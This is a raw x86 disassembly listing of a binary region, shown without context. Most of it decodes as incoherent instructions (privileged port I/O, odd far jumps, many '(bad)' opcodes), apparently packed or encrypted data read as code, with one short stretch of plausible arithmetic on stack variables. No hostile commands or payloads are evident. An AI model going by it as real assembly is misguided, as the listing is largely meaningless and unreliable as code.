  415cd2:	sbb    eax,0xf394d389
  415cd7:	arpl   WORD PTR [esi-0x18ae046],cx
  415cdd:	je     0x415c79
  415cdf:	sbb    al,0x96
  415ce1:	and    dh,BYTE PTR [esp+edx*1+0x1b]
  415ce5:	mov    eax,ds:0x2997295
  415cea:	lods   eax,DWORD PTR ds:[esi]
  415ceb:	xchg   DWORD PTR [ecx+eiz*8+0x34],esi
  415cef:	in     al,dx
  415cf0:	mov    esp,0x2a910c95
  415cf5:	jns    0x415d36
  415cf7:	out    0x93,eax
  415cf9:	test   BYTE PTR [eax],bh
  415cfb:	arpl   WORD PTR [edi+0x2f],cx
  415cfe:	dec    eax
  415cff:	test   al,0x39
  415d01:	pop    ss
  415d02:	jl     0x415d3d
  415d04:	or     esp,ebp
  415d06:	popa   
  415d07:	sbb    BYTE PTR [edx+0x43],bh
  415d0a:	or     bl,BYTE PTR [ebx-0x12]
  415d0d:	ds sbb eax,0x58af3da9
  415d13:	out    dx,al
  415d14:	and    al,0x62
  415d16:	repnz lahf 
  415d18:	jp     0x415ca2
  415d1a:	xchg   ebp,eax
  415d1b:	mov    ds:0x972ee56b,eax
  415d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d21:	mov    al,0x50
  415d23:	mov    edx,0x2be7c277
  415d28:	enter  0xc05a,0x22
  415d2c:	test   al,0xa4
  415d2e:	imul   esp,DWORD PTR [ebx-0x6d],0x25
  415d32:	iret   
  415d33:	mov    dl,0x71
  415d35:	(bad)  [ebx-0x6f]
  415d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d39:	mul    BYTE PTR [edx]
  415d3b:	push   0xc17d7427
  415d40:	jl     0x415d57
  415d42:	xor    eax,DWORD PTR [esi-0x8bf4226]
  415d48:	sti    
  415d49:	out    0xed,eax
  415d4b:	adc    BYTE PTR [eax+edx*4-0x3289ce6d],al
  415d52:	lea    ecx,[esi+ecx*8]
  415d55:	xchg   esi,eax
  415d56:	jne    0x415dc8
  415d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d59:	sub    edx,eax
  415d5b:	in     al,dx
  415d5c:	js     0x415d56
  415d5e:	dec    eax
  415d5f:	clc    
  415d60:	bound  edi,QWORD PTR [edx-0x1b]
  415d63:	sar    DWORD PTR [eax],1
  415d65:	and    DWORD PTR [ebp+0x7d],eax
  415d68:	cs dec eax
  415d6a:	loop   0x415d8f
  415d6c:	push   esi
  415d6d:	and    ch,BYTE PTR [ecx+0x1d]
  415d70:	out    0xb4,al
  415d72:	push   esi
  415d73:	or     DWORD PTR [esi-0x1c1b4a3e],edi
  415d79:	add    dh,BYTE PTR [ebp+0x6131db9e]
  415d7f:	data16 rcr BYTE PTR [ebx+0x115d9c19],cl
  415d86:	aaa    
  415d87:	add    DWORD PTR [eax],esp
  415d89:	mov    DWORD PTR [edi+0x6c5914f4],eax
  415d8f:	pop    ebp
  415d90:	or     bh,dh
  415d92:	outs   dx,BYTE PTR ds:[esi]
  415d93:	inc    esp
  415d94:	mov    dh,0x4a
  415d96:	dec    edi
  415d97:	fisubr DWORD PTR [eax]
  415d99:	iret   
  415d9a:	xchg   ecx,eax
  415d9b:	pop    eax
  415d9c:	adc    eax,0x90b652be
  415da1:	and    BYTE PTR [eax-0x22],0xd9
  415da5:	push   ds
  415da6:	fidivr DWORD PTR [eax]
  415da8:	(bad)
  415dab:	add    eax,0x296e41bd
  415db0:	repnz xor al,0x3e
  415db3:	test   eax,0x661cc7aa
  415db8:	jbe    0x415de2
  415dba:	push   DWORD PTR [ebx-0x1df88e01]
  415dc0:	enter  0x130d,0xf3
  415dc4:	test   al,0x71
  415dc6:	dec    edi
  415dc7:	mov    ch,0xce
  415dc9:	push   0xb
  415dcb:	dec    edx
  415dcc:	xchg   esp,eax
  415dcd:	mov    eax,ds:0x4333b120
  415dd2:	or     eax,0xc67ae9c4
  415dd7:	mov    BYTE PTR ds:0x984a5f3e,dl
  415ddd:	sbb    BYTE PTR [edx+ecx*1+0x535c8d0f],bl
  415de4:	loopne 0x415e30
  415de6:	inc    ebp
  415de7:	fbld   TBYTE PTR [edi+0x2cede9a7]
  415ded:	pusha  
  415dee:	adc    eax,0x870c844c
  415df3:	ss inc edi
  415df5:	call   0x49ec:0xd52d9a2f
  415dfc:	clc    
  415dfd:	push   ecx
  415dfe:	das    
  415dff:	push   edx
  415e00:	mov    dl,0x4e
  415e02:	arpl   si,si
  415e04:	test   BYTE PTR ds:0x96850898,cl
  415e0a:	mov    cl,0x2b
  415e0c:	imul   edx,DWORD PTR [edx],0x3d6cfc6d
  415e12:	pop    esp
  415e13:	stos   BYTE PTR es:[edi],al
  415e14:	push   edx
  415e15:	shl    DWORD PTR [ecx+0x49],1
  415e18:	jg     0x415de8
  415e1a:	xor    ebx,DWORD PTR [ebx]
  415e1c:	mov    ebp,0x89abb2b4
  415e21:	mov    WORD PTR [esi],?
  415e23:	sbb    dh,BYTE PTR [ecx+ebp*4-0x3f8f4d20]
  415e2a:	or     eax,0x943d98b9
  415e2f:	sub    BYTE PTR ds:0x3369b39d,bl
  415e35:	jmp    0x415e03
  415e37:	out    0x13,al
  415e39:	mov    gs,WORD PTR [eax+esi*1]
  415e3c:	popa   
  415e3d:	xor    BYTE PTR [edi+edi*8+0x48346de0],0xfe
  415e45:	dec    edi
  415e46:	fiadd  WORD PTR [esi]
  415e48:	dec    esp
  415e49:	push   ss
  415e4a:	xor    BYTE PTR [ebx+eiz*1+0x3e],cl
  415e4e:	div    BYTE PTR [edx-0x3e]
  415e51:	retf   
  415e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e53:	mov    bh,bl
  415e55:	and    al,ah
  415e57:	gs es ss cld 
  415e5b:	xchg   esp,eax
  415e5c:	test   BYTE PTR ds:0x2e889194,ch
  415e62:	pop    eax
  415e63:	sub    esp,edx
  415e65:	pop    ecx
  415e66:	data16 in al,0x1e
  415e69:	push   0x5d2b90e1
  415e6e:	add    ecx,esi
  415e70:	mov    ah,0x4c
  415e72:	dec    esp
  415e73:	xchg   DWORD PTR [ebx+0x649678d1],ecx
  415e79:	fs jmp 0x5af376f1
  415e7f:	fisttp DWORD PTR [edi+0x3cee25eb]
  415e85:	add    DWORD PTR [edx-0x72cb74e],ecx
  415e8b:	bound  ebp,QWORD PTR [eax+ebp*4]
  415e8e:	out    0xf8,eax
  415e90:	dec    ebp
  415e91:	into   
  415e92:	jne    0x415ecd
  415e94:	xor    BYTE PTR ds:0xc1293e5a,cl
  415e9a:	dec    ecx
  415e9b:	mul    DWORD PTR ds:0x2abce213
  415ea1:	mov    al,ds:0xbb2e3f31
  415ea6:	loopne 0x415f14
  415ea8:	loope  0x415f21
  415eaa:	cmp    BYTE PTR [ebx-0x34],dl
  415ead:	and    eax,DWORD PTR [ebp-0x7d06c36a]
  415eb3:	pop    eax
  415eb4:	add    BYTE PTR [edx],al
  415eb6:	(bad)  
  415eb7:	xchg   esp,eax
  415eb8:	or     BYTE PTR gs:[ecx],dl
  415ebb:	xchg   esi,eax
  415ebc:	call   0x7c8cc99
  415ec1:	adc    eax,DWORD PTR [ecx-0x69]
  415ec4:	pop    dx
  415ec7:	dec    ebx
  415ec8:	retf   0xafbd
  415ecb:	nop
  415ecc:	scas   al,BYTE PTR es:[edi]
  415ecd:	(bad)
  415ed0:	mov    DWORD PTR [ebp+0x7f],esi
  415ed3:	in     al,0xd5
  415ed5:	mov    al,0x57
  415ed7:	pop    ebx
  415ed8:	sub    eax,0x5801eb73
  415edd:	stc    
  415ede:	cmp    ebp,DWORD PTR [edi+edi*8-0x49]
  415ee2:	pop    ss
  415ee3:	add    al,bl
  415ee5:	call   0x6115f42f
  415eea:	push   bp
  415eec:	sbb    esi,DWORD PTR [edx+0x65]
  415eef:	xlat   BYTE PTR ds:[ebx]
  415ef0:	rcl    BYTE PTR [ecx+ecx*2],0x6a
  415ef4:	pushf  
  415ef5:	xor    DWORD PTR [esi-0x151d7cc6],ebp
  415efb:	call   0x140:0x14fe897
  415f02:	cmp    dl,0xb0
  415f05:	sub    ah,0xa6
  415f08:	es jmp 0xd797b4dc
  415f0e:	das    
  415f0f:	push   0xffffffd6
  415f11:	stos   DWORD PTR es:[edi],eax
  415f12:	and    dh,ch
  415f14:	rol    DWORD PTR ds:0x98c25d8d,cl
  415f1a:	push   es
  415f1b:	in     eax,dx
  415f1c:	pop    ds
  415f1d:	inc    ebp
  415f1e:	lea    ebp,[esi-0x1dbbaf86]
  415f24:	inc    ecx
  415f25:	arpl   bx,bx
  415f27:	dec    ecx
  415f28:	sub    dh,al
  415f2a:	jnp    0x415ef8
  415f2c:	mov    BYTE PTR [ebx+0x7c0e8e4c],al
  415f32:	or     DWORD PTR ds:0x262022d1,edx
  415f38:	cwde   
  415f39:	dec    edi
  415f3a:	leave  
  415f3b:	loope  0x415f79
  415f3d:	mov    cl,0x76
  415f3f:	push   ebx
  415f40:	jl     0x415f68
  415f42:	rol    al,0xb4
  415f45:	test   BYTE PTR [ebx-0x3f1465da],ch
  415f4b:	pop    edi
  415f4c:	pop    ss
  415f4d:	mov    ebp,0x504f5a53
  415f52:	(bad)  
  415f53:	pop    ecx
  415f54:	push   esi
  415f55:	mov    ebx,0x27d97c22
  415f5a:	jmp    0x8845:0xe270b191
  415f61:	es jp  0x415f69
  415f64:	sbb    BYTE PTR [edx+eiz*4-0x69],ah
  415f68:	int    0x29
  415f6a:	cmp    ah,BYTE PTR [edi]
  415f6c:	lock rcl DWORD PTR [ebp-0x26b28798],0x19
  415f74:	out    dx,eax
  415f75:	lods   eax,DWORD PTR ds:[esi]
  415f76:	push   esi
  415f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f78:	pop    ebx
  415f79:	jnp    0x415f17
  415f7b:	aaa    
  415f7c:	cmp    DWORD PTR [ebx+0x57],edi
  415f7f:	add    BYTE PTR [edx-0x2c556a8c],0x7d
  415f86:	int    0x85
  415f88:	xchg   ecx,eax
  415f89:	sahf   
  415f8a:	leave  
  415f8b:	fwait
  415f8c:	dec    edi
  415f8d:	int    0x8c
  415f8f:	in     eax,dx
  415f90:	jecxz  0x415fe8
  415f92:	push   0x8cc92783
  415f97:	loope  0x415fa4
  415f99:	push   esi
  415f9a:	mov    ebp,esp
  415f9c:	jbe    0x415f4a
  415f9e:	fcom   st(4)
  415fa0:	fist   WORD PTR [eax]
  415fa2:	mov    eax,0x3618e94b
  415fa7:	adc    ah,BYTE PTR [edi+edx*8-0x61]
  415fab:	pushf  
  415fac:	stos   BYTE PTR es:[edi],al
  415fad:	lahf   
  415fae:	popa   
  415faf:	pop    ebx
  415fb0:	mov    edx,0x2f1d4daa
  415fb5:	add    eax,0x9b351f9b
  415fba:	push   ebx
  415fbb:	and    eax,0xec392eda
  415fc0:	cmp    dl,BYTE PTR [ecx-0x70]
  415fc3:	mov    dl,0xcc
  415fc5:	jge    0x415f7b
  415fc7:	lods   al,BYTE PTR ds:[esi]
  415fc8:	ja     0x415fcf
  415fca:	stos   DWORD PTR es:[edi],eax
  415fcb:	xor    al,0xe0
  415fcd:	daa    
  415fce:	scas   al,BYTE PTR es:[edi]
  415fcf:	inc    ecx
  415fd0:	leave  
  415fd1:	or     ecx,DWORD PTR [ebx]
  415fd3:	xchg   ebp,eax
  415fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd5:	jmp    0x9c3234b9
  415fda:	jmp    0x9d17e806
  415fdf:	(bad)  
  415fe0:	cmp    al,0xe7
  415fe2:	sub    dl,BYTE PTR [edx-0x6fc631b7]
  415fe8:	mov    eax,ds:0x8f7319e4
  415fed:	fmul   QWORD PTR [edx+edx*1]
  415ff0:	(bad)  
  415ff1:	mov    ch,0x6b
  415ff3:	push   ds
  415ff4:	adc    al,0xe2
  415ff6:	lods   eax,DWORD PTR ds:[esi]
  415ff7:	mov    WORD PTR [eax+0x3e6b7e1d],fs
  415ffd:	pop    eax
  415ffe:	xchg   esp,eax
  415fff:	mov    ah,BYTE PTR [eax-0x866b57c]
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xb4de4428
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	cs xor eax,0x1b4aa7bc
  416061:	je     0x416078
  416063:	push   edi
  416064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416065:	in     al,0x87
  416067:	sbb    BYTE PTR [ebp+0x77],ah
  41606a:	or     ah,BYTE PTR [eax]
  41606c:	xor    al,0x39
  41606e:	push   es
  41606f:	mov    ds:0x9a671e32,al
  416074:	call   0x7f5b3127
  416079:	pop    ebx
  41607a:	adc    eax,0xb23c0004
  41607f:	and    BYTE PTR [edi+0x72b9822e],bl
  416085:	sub    ah,BYTE PTR [ebp-0x61]
  416088:	xor    eax,0xb3e8ff01
  41608d:	jle    0x416061
  41608f:	stos   DWORD PTR es:[edi],eax
  416090:	mov    ?,WORD PTR [ecx+0x20]
  416093:	repz jno 0x416025
  416096:	iret   
  416097:	mov    al,0x49
  416099:	mov    ecx,0x5b53b83
  41609e:	rol    BYTE PTR [ebx],1
  4160a0:	jns    0x4160fc
  4160a2:	sbb    eax,0xb1a79d7e
  4160a7:	dec    edx
  4160a8:	jl     0x4160ae
  4160aa:	ja     0x416081
  4160ac:	dec    ebp
  4160ad:	pop    es
  4160ae:	int    0xa0
  4160b0:	jno    0x416104
  4160b2:	shl    DWORD PTR [eax-0x353b8da1],cl
  4160b8:	sbb    BYTE PTR [edi],cl
  4160ba:	mov    WORD PTR [edx-0x7901dc69],cs
  4160c0:	sub    DWORD PTR [edi+eiz*1+0x2f0added],eax
  4160c7:	loopne 0x41611d
  4160c9:	cmp    BYTE PTR [edx+0x37],ch
  4160cc:	ins    BYTE PTR es:[edi],dx
  4160cd:	sbb    BYTE PTR [ecx-0x51],dl
  4160d0:	sti    
  4160d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d2:	lods   eax,DWORD PTR ds:[esi]
  4160d3:	addr16 and eax,0xb1a58545
  4160d9:	bound  edi,QWORD PTR [eax-0x617032cc]
  4160df:	out    0xe5,eax
  4160e1:	loop   0x416109
  4160e3:	mov    dl,0x84
  4160e5:	in     al,0xc1
  4160e7:	mov    al,0xc2
  4160e9:	push   es
  4160ea:	adc    BYTE PTR [edx-0x1b],ah
  4160ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ee:	mov    ds,WORD PTR [edi+0x5395a1fd]
  4160f4:	aad    0xc8
  4160f6:	cdq    
  4160f7:	fld    st(7)
  4160f9:	fcom   QWORD PTR [eax]
  4160fb:	loopne 0x416165
  4160fd:	cmp    ah,BYTE PTR [eax]
  4160ff:	xor    ebp,DWORD PTR [edx]
  416101:	ret    0x3160
  416104:	pushf  
  416105:	loopne 0x41613b
  416107:	fs out 0xec,eax
  41610a:	xchg   ebx,eax
  41610b:	fidivr WORD PTR [ebp+0x75]
  41610e:	fsubr  QWORD PTR [eax]
  416110:	pop    eax
  416111:	mov    ds:0x873506c1,al
  416116:	int    0x54
  416118:	fistp  DWORD PTR [esi+0x5d]
  41611b:	imul   edx,DWORD PTR [edi-0x72c1fcb8],0x2e
  416122:	inc    ecx
  416123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416125:	lock lods al,BYTE PTR ds:[esi]
  416127:	lock jno 0x416163
  41612a:	and    bl,0x5c
  41612d:	inc    ebp
  41612e:	into   
  41612f:	scas   al,BYTE PTR es:[edi]
  416130:	xor    eax,0x4c0d0805
  416135:	mov    edx,0x253e4cc4
  41613a:	add    eax,DWORD PTR [eax+edi*8-0x2a]
  41613e:	not    DWORD PTR [ebp+0x8724de4]
  416144:	out    dx,eax
  416145:	sbb    eax,ecx
  416147:	mov    bl,0xbf
  416149:	inc    ebp
  41614a:	jmp    0x7b98e73d
  41614f:	loop   0x4161bf
  416151:	fldl2e 
  416153:	enter  0x3659,0xa4
  416157:	shr    BYTE PTR [ebx-0x595c6078],1
  41615d:	jbe    0x4161b2
  41615f:	cld    
  416160:	div    DWORD PTR ds:0x203cefb
  416166:	sub    dl,ah
  416168:	pop    ss
  416169:	sub    BYTE PTR [esp+eiz*2-0x79],dh
  41616d:	shl    DWORD PTR [eax+0x1a5e4e26],cl
  416173:	pop    ebp
  416174:	mov    edx,0xcec13413
  416179:	mov    ch,0x5
  41617b:	repz fisubr WORD PTR [ebp+eax*2+0xf]
  416180:	mov    WORD PTR [esi+0x42],gs
  416183:	imul   ebx,DWORD PTR [esp],0x55
  416187:	mov    cl,0x2f
  416189:	stos   DWORD PTR es:[edi],eax
  41618a:	mov    eax,ds:0x9a326b5d
  41618f:	repz imul esi,DWORD PTR [ecx],0xaf8d3afa
  416196:	mov    al,bl
  416198:	outs   dx,BYTE PTR ds:[esi]
  416199:	and    BYTE PTR [eax],ch
  41619b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41619c:	mov    eax,ds:0x719cbeed
  4161a1:	or     bh,BYTE PTR [eax-0x3]
  4161a4:	das    
  4161a5:	inc    edi
  4161a6:	fwait
  4161a7:	gs inc edx
  4161a9:	xor    eax,0xd6e63ba3
  4161ae:	sub    al,0x0
  4161b0:	xchg   ebx,eax
  4161b1:	push   ebx
  4161b2:	push   esi
  4161b3:	ins    DWORD PTR es:[edi],dx
  4161b4:	xlat   BYTE PTR ds:[ebx]
  4161b5:	mov    bl,0x8
  4161b7:	repnz in eax,0xd6
  4161ba:	dec    edx
  4161bb:	dec    eax
  4161bc:	mov    ch,0x9
  4161be:	push   esi
  4161bf:	jb     0x416233
  4161c1:	xchg   BYTE PTR [edx-0x3],dh
  4161c4:	inc    esi
  4161c5:	pushf  
  4161c6:	xchg   esi,eax
  4161c7:	push   edx
  4161c8:	inc    esi
  4161c9:	lea    esi,[edi+0x45]
  4161cc:	int    0xfc
  4161ce:	daa    
  4161cf:	sub    BYTE PTR [ebx-0x3bf01fa2],bl
  4161d5:	xor    eax,0x9ad826de
  4161da:	fwait
  4161db:	xor    al,0x20
  4161dd:	daa    
  4161de:	dec    esp
  4161df:	repz and ah,BYTE PTR [ebp-0x32]
  4161e3:	dec    ebp
  4161e4:	rcr    BYTE PTR fs:[ebp+0x6843cda5],cl
  4161eb:	in     al,dx
  4161ec:	jmp    0xbe396f9a
  4161f1:	out    dx,al
  4161f2:	clc    
  4161f3:	mov    fs,WORD PTR [eax+0xc4eaf73]
  4161f9:	enter  0xd678,0x73
  4161fd:	xchg   esi,eax
  4161fe:	test   DWORD PTR [eax-0x6e416b31],esi
  416204:	cmp    eax,0x3c321af5
  416209:	push   esi
  41620a:	retf   
  41620b:	jae    0x4161fe
  41620d:	cmp    eax,0xe92b4db
  416212:	and    dh,BYTE PTR [ecx+ebx*4-0x48]
  416216:	push   es
  416217:	mov    ds:0xd11a51c8,al
  41621c:	cdq    
  41621d:	out    0xc3,eax
  41621f:	or     BYTE PTR [eax-0x30],0xfa
  416223:	sub    ch,BYTE PTR [eax+esi*2-0x73]
  416227:	cli    
  416228:	xor    cl,bh
  41622a:	pop    eax
  41622b:	(bad)  
  41622c:	cld    
  41622d:	push   edi
  41622e:	xchg   DWORD PTR [esi+0x6b],eax
  416231:	xor    eax,0x84432faa
  416236:	mov    al,ds:0x84729285
  41623b:	sbb    DWORD PTR [ecx],esi
  41623d:	xchg   edx,eax
  41623e:	adc    eax,0xfa083764
  416243:	out    dx,al
  416244:	dec    edi
  416245:	stos   BYTE PTR es:[edi],al
  416246:	dec    edx
  416247:	add    cl,0x9b
  41624a:	scas   eax,DWORD PTR es:[edi]
  41624b:	ret    0xdd08
  41624e:	out    0xfb,eax
  416250:	push   edx
  416251:	aaa    
  416252:	inc    edi
  416253:	pusha  
  416254:	in     eax,0xe9
  416256:	aam    0x45
  416258:	push   ds
  416259:	mov    bl,0x4
  41625b:	sbb    al,0x78
  41625d:	jne    0x416252
  41625f:	pushf  
  416260:	xchg   edi,eax
  416261:	ret    0x8a64
  416264:	sbb    DWORD PTR [ebx],0x4b99501e
  41626a:	adc    BYTE PTR [edx-0x7],dl
  41626d:	scas   al,BYTE PTR es:[edi]
  41626e:	mov    ds:0xc86142c0,eax
  416273:	addr16 daa 
  416275:	sti    
  416276:	dec    ebp
  416277:	mov    bl,0xb2
  416279:	or     DWORD PTR [edx],esi
  41627b:	fs fcmovbe st,st(3)
  41627e:	cli    
  41627f:	pop    esi
  416280:	ret    
  416281:	(bad)  
  416282:	mov    ecx,0x556c7a5a
  416287:	scas   al,BYTE PTR es:[edi]
  416288:	pop    esi
  416289:	xlat   BYTE PTR ds:[ebx]
  41628a:	enter  0xd08e,0x76
  41628e:	and    eax,0x5b5d41a3
  416293:	aam    0x9d
  416295:	xlat   BYTE PTR ds:[ebx]
  416296:	jmp    FWORD PTR [edi-0x7e0657e2]
  41629c:	ds cmp eax,0xdf8c81d0
  4162a2:	ds in  eax,dx
  4162a4:	test   ebp,esp
  4162a6:	and    eax,0xe2e9536f
  4162ab:	mov    eax,ds:0x9a2694c3
  4162b0:	lods   eax,DWORD PTR ds:[esi]
  4162b1:	pop    edi
  4162b2:	xchg   ebx,eax
  4162b3:	hlt    
  4162b4:	push   0xe2de185f
  4162b9:	push   cs
  4162ba:	push   0x987d20d
  4162bf:	inc    ecx
  4162c0:	add    BYTE PTR [edi+0x146f0f75],ch
  4162c6:	or     ah,BYTE PTR [eax]
  4162c8:	mov    dl,0x3f
  4162ca:	(bad)  
  4162cb:	scas   al,BYTE PTR es:[edi]
  4162cc:	cmp    bl,BYTE PTR [eax+0x5f]
  4162cf:	jmp    0x416334
  4162d1:	lock mov BYTE PTR [edi+0x22],bh
  4162d5:	mov    edx,0x88e17fcd
  4162db:	xor    esp,ebp
  4162dd:	jno    0x416285
  4162df:	idiv   BYTE PTR [ecx+0x71f13a58]
  4162e5:	mov    ah,0x76
  4162e7:	adc    ch,BYTE PTR [ecx+0x51e3b065]
  4162ed:	jb     0x41633a
  4162ef:	retf   
  4162f0:	js     0x416286
  4162f2:	cld    
  4162f3:	into   
  4162f4:	add    ch,BYTE PTR [esi+esi*8+0x2b]
  4162f8:	push   ecx
  4162f9:	and    eax,0xd8ec76c3
  4162fe:	popf   
  4162ff:	retf   0xa59e
  416302:	mov    cl,0xce
  416304:	and    DWORD PTR [esi+0x76ccf305],0xffffff81
  41630b:	pop    ecx
  41630c:	jne    0x41628e
  41630e:	ins    BYTE PTR es:[edi],dx
  41630f:	aam    0xb7
  416311:	sbb    BYTE PTR [edx-0x20],ch
  416314:	jge    0x416349
  416316:	pop    edx
  416317:	cmp    ch,BYTE PTR [ecx+0x70]
  41631a:	cmp    eax,0x76349002
  41631f:	jle    0x4162ca
  416321:	xchg   ebx,eax
  416322:	shr    BYTE PTR [edi-0xd],1
  416325:	cmp    BYTE PTR [ecx+edx*4+0x2d],ah
  416329:	mov    DWORD PTR [ebp-0x8a8f046],ebp
  41632f:	frstor [edx+0x74]
  416332:	test   al,0x66
  416334:	mov    bh,0x64
  416336:	jae    0x41630c
  416338:	dec    eax
  416339:	fsubr  QWORD PTR [eax]
  41633b:	(bad)  
  41633c:	mov    bl,0x94
  41633e:	rol    bl,cl
  416340:	mov    al,0xd
  416342:	(bad)  
  416343:	popa   
  416344:	xchg   ebp,eax
  416345:	std    
  416346:	fninit 
  416348:	repz aam 0x19
  41634b:	push   cs
  41634c:	xchg   esi,eax
  41634d:	dec    esi
  41634e:	daa    
  41634f:	push   eax
  416350:	es aam 0x79
  416353:	in     eax,dx
  416354:	mov    eax,eax
  416356:	mov    ebp,0xe69ee3a1
  41635b:	ins    DWORD PTR es:[edi],dx
  41635c:	aad    0xd
  41635e:	int    0x65
  416360:	lahf   
  416361:	cwde   
  416362:	jne    0x41637e
  416364:	mov    ds,WORD PTR [edx]
  416366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416367:	int    0x75
  416369:	rcl    BYTE PTR [esi+0x18],cl
  41636c:	mov    DWORD PTR [edi],ebp
  41636e:	icebp  
  41636f:	int    0xcc
  416371:	push   eax
  416372:	xchg   ecx,eax
  416373:	int    0x82
  416375:	loop   0x416315
  416377:	pop    ebx
  416378:	out    0x6c,eax
  41637a:	fwait
  41637b:	or     ch,ch
  41637d:	pop    edi
  41637e:	nop
  41637f:	cmc    
  416380:	imul   edx,DWORD PTR [eax-0x48c01d3d],0x2825574d
  41638a:	andps  xmm0,XMMWORD PTR [edx-0x6755d0f6]
  416391:	(bad)  
  416392:	fsub   st,st(1)
  416394:	adc    al,0x85
  416396:	or     DWORD PTR [edi+eax*2],esp
  416399:	lds    edx,FWORD PTR [ecx-0x47696c76]
  41639f:	xchg   ebp,eax
  4163a0:	add    eax,0xe628fef1
  4163a5:	xchg   ebx,eax
  4163a6:	into   
  4163a7:	mov    bl,0x7
  4163a9:	xlat   BYTE PTR ds:[ebx]
  4163aa:	jb     0x416356
  4163ac:	test   dh,ah
  4163ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163af:	mov    ebx,0xb93b31d
  4163b4:	idiv   BYTE PTR [esi-0x219111eb]
  4163ba:	and    DWORD PTR [eax-0x2d7e3314],esp
  4163c0:	lods   al,BYTE PTR ds:[esi]
  4163c1:	add    ebx,0x3a8e9a83
  4163c7:	shr    BYTE PTR [ebx+0x18aa8857],1
  4163cd:	mov    eax,0xd1fca61
  4163d2:	inc    edi
  4163d3:	jnp    0x41642b
  4163d5:	fcomp  QWORD PTR [eax-0x58]
  4163d8:	pop    edx
  4163d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163da:	(bad)  
  4163dc:	push   eax
  4163dd:	(bad)
  4163e1:	push   esi
  4163e2:	and    eax,0x3e1d0c1b
  4163e7:	jg     0x4163b2
  4163e9:	mov    dh,dl
  4163eb:	xor    al,0x22
  4163ed:	cmp    BYTE PTR [eax-0x78bd5564],bh
  4163f3:	fcmovu st,st(6)
  4163f5:	sub    al,0xc2
  4163f7:	mov    dh,0x9d
  4163f9:	inc    ebx
  4163fa:	dec    ebx
  4163fb:	retf   0x5a76
  4163fe:	push   ss
  4163ff:	dec    eax
  416400:	mov    eax,ds:0xdaadb2f2
  416405:	push   0x3b
  416407:	mov    es,WORD PTR ds:0xc9b2a52c
  41640d:	leave  
  41640e:	stos   DWORD PTR es:[edi],eax
  41640f:	jnp    0x4163e1
  416411:	fsub   QWORD PTR [ebx]
  416413:	repnz push edx
  416415:	rol    DWORD PTR ds:0xdb250691,cl
  41641b:	ins    DWORD PTR es:[edi],dx
  41641c:	scas   eax,DWORD PTR es:[edi]
  41641d:	push   cs
  41641e:	xchg   edx,eax
  41641f:	or     eax,0x64728a3c
  416424:	ins    BYTE PTR es:[edi],dx
  416425:	mov    esp,0xb7b0cba5
  41642a:	lock cli 
  41642c:	pop    edx
  41642d:	fnstenv [ecx+0x5e]
  416430:	cmp    DWORD PTR [ebp+0x4e],eax
  416433:	cmp    al,0x33
  416435:	push   ss
  416436:	xor    BYTE PTR [eax-0x56],dh
  416439:	pop    ecx
  41643a:	cmp    al,0x86
  41643c:	out    dx,eax
  41643d:	outs   dx,BYTE PTR ds:[esi]
  41643e:	nop
  41643f:	cli    
  416440:	in     eax,dx
  416441:	jle    0x416445
  416443:	pushf  
  416444:	loope  0x416406
  416446:	inc    edx
  416447:	sub    BYTE PTR [edx-0x3f],cl
  41644a:	adc    eax,0xc7aa0bc
  41644f:	xlat   BYTE PTR ds:[ebx]
  416450:	ss dec esi
  416452:	(bad)  
  416454:	dec    edi
  416455:	cmp    ch,bl
  416457:	into   
  416458:	jae    0x416488
  41645a:	(bad)  
  41645c:	(bad)  [edi]
  41645e:	cmp    BYTE PTR [esi+0x4c],0xef
  416462:	test   eax,0xe1f83106
  416467:	into   
  416468:	xor    bl,BYTE PTR [ebx-0x66fc5469]
  41646e:	pop    edi
  41646f:	xchg   ebp,eax
  416470:	mov    ds:0x7032bdcc,eax
  416475:	xchg   esp,eax
  416476:	(bad)  
  416477:	gs inc ebp
  416479:	or     ebx,ecx
  41647b:	mov    dl,0xa2
  41647d:	iret   
  41647e:	sar    BYTE PTR [esi-0x1],1
  416481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416482:	pop    DWORD PTR [edx+ebp*8-0x53]
  416486:	sbb    al,0x3a
  416488:	mov    cl,0x94
  41648a:	inc    edi
  41648b:	outs   dx,DWORD PTR ds:[esi]
  41648c:	out    0x91,eax
  41648e:	adc    DWORD PTR [eax+0x5e40195],esi
  416494:	pushf  
  416495:	stos   WORD PTR es:[edi],ax
